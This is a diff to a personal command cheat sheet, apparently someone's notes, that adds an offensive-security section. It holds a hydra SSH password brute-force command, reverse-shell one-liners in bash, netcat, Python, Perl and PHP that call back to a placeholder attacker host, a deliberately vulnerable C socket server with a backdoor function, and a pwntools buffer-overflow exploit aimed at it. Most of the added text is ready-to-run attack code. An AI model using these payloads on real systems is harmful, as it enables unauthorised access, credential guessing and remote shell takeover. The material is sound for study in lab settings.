@@ -147,13 +147,6 @@ rm -fr DroidSansMono.zip
 http://supervisord.org/
 ```
 
-#====== 密码破解
-```sh 
-# -l username 
-# -P password dict 
-# -t thread 
-hydra -l root -P /root/pass.txt -t 16 192.168.110.7 ssh
-```
 
 #====== grpc_cli
 ```sh
@@ -167,4 +160,97 @@ grpc_cli ls localhost:50051 helloworld.Greeter.SayHello -l
 grpc_cli type localhost:50051 helloworld.HelloRequest
 #call a remote method 
 grpc_cli call localhost:50051 SayHello "name: 'gRPC CLI'"
+```
+
+#-----------------------------------------------secure way
+#====== password cracking
+```sh 
+# -l username 
+# -P password dict 
+# -t thread 
+hydra -l root -P /root/pass.txt -t 16 192.168.110.7 ssh
+```
+
+#====== bounce shell
+```sh
+#-------------------bash,python,perl
+#attacker
+### open port 12345 and listening
+nc -lvvp 12345
+
+#target
+#-------------------bash
+bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1
+###or
+nc -e /bin/bash attacker_ip attacker_port
+#-------------------python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",attacker_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+#-------------------perl
+perl -e 'use Socket;$i="attacker_ip";$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+#-------------------php
+php -r '$sock=fsockopen("attacker_ip",attacker_port);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+
+#====== buffer overflow
+##target *.cpp
+```sh
+#include<stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#define SERVER_PORT 12345
+void backdooorr() {
+system("/bin/sh -c whoami > /tmp/evil.txt");
+}
+int main() {
+  char buf[8];
+  int serverSocket;
+  struct sockaddr_in server_addr;
+  struct sockaddr_in clientAddr;
+  int addr_len = sizeof(clientAddr);
+  int client;
+  char buffer[200];
+  int iDataNum;
+  serverSocket = socket(AF_INET, SOCK_STREAM, 0);
+  bzero(&server_addr, sizeof(server_addr));
+  server_addr.sin_family = AF_INET;
+  server_addr.sin_port = htons(SERVER_PORT);
+  server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+  if (bind(serverSocket, (struct sockaddr *)&server_addr, sizeof(server_addr))<0){
+      return -1;
+  }
+  listen(serverSocket, 5);
+  while (1) {
+    client = accept(serverSocket, (struct sockaddr *)&clientAddr,
+                    (socklen_t *)&addr_len);
+    printf("%d\n",ntohs(clientAddr.sin_port));
+    read(client, buf, 0x30);
+    break;
+  }
+  return 0;
+}
+```
+## attacker 
+```sh
+# get pwn way 
+pt-get update
+apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
+python3 -m pip install --upgrade pip
+python3 -m pip install --upgrade pwntools
+
+# *.py
+from pwn import * 
+cn=remote('192.168.120.192',12345) # 靶机部署的地址 
+cn.sendline(p64(0)*3+p64(0x4011b6))
+cn.interactive()
 ```
